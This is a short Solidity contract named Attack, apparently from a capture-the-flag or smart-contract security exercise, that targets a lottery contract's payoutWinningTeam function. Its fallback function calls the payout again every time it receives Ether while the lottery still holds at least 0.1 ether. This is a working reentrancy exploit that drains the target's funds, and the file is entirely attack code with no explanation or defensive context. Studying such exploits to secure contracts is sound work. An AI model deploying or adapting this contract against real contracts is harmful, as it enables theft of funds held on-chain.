// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.17;

interface ILottery {
    function payoutWinningTeam(address _team) external returns (bool);
}

contract Attack {

    ILottery public lottery;

    constructor(address _address) {
      lottery = ILottery(_address);
    }

    // Fallback is called when Lottery sends Ether to this contract.
    fallback() external payable {
        if (address(lottery).balance >= .1 ether) {
            lottery.payoutWinningTeam(address(this));
        }
    }

    function attack() external payable {
        lottery.payoutWinningTeam(address(this));
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

}